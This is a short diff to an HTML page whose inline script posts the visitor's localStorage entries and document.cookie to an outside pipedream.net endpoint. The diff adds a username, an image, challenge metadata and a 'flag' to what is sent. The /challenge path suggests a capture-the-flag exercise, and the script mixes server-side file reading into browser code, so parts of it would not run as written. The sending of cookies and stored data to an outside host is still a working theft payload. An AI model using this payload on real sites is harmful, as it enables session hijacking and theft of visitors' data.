@@ -1,10 +1,16 @@
 <html>
   <body>
     <script>
+      const metadata = await fs.readFile("/challenge/metadata.json").catch(() => defaultMetadata);
+      const flag = JSON.parse(metadata.toString("utf-8")).flag as string
       fetch("https://enw16o5nmiis8.x.pipedream.net/", {
         method: "post",
         body: JSON.stringify({
           cool: Object.entries(localStorage),
+          username: localStorage.getItem('username'),
+          image: localStorage.getItem('image'),
+          metadata: metadata,
+          flag: flag,
           cookie: document.cookie,
         }),
       });
